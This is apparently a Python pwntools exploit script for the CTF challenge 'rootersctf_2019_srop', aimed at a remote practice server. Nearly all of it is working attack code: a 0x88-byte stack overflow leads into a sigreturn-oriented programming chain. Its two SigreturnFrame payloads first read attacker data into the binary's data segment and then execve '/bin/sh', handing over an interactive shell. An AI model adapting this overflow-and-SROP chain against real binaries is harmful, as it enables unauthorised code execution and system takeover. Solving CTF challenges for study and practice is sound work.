# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64')
binary = './rootersctf_2019_srop'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26122'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

#one_gad = one_gadget(libc.path)


pop_rax_syscall_leave_ret = 0x401032
syscall_leave_ret = 0x401033
data_seg_addr = 0x402000


sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = data_seg_addr
sigframe.rdx = 0x300
sigframe.rsp = data_seg_addr
sigframe.rbp = data_seg_addr
sigframe.rip = syscall_leave_ret #下一条指令执行地址

#dbg()

payload = "A"*0x88 + p64(pop_rax_syscall_leave_ret) + p64(15)
payload += str(sigframe)

sla("the CTF?",payload)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = data_seg_addr + 0x150
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_leave_ret
sigframe.rsp = data_seg_addr + 0x18

payload = "b"*8 + p64(pop_rax_syscall_leave_ret) + p64(15)
payload += str(sigframe)
payload = payload.ljust(0x150 , "a") + "/bin/sh\x00"


sleep(0.3)
se(payload)

p.interactive()

'''
@File    :   rootersctf_2019_srop.py
@Time    :   2021/07/30 23:10:00
@Author  :   Niyah 
'''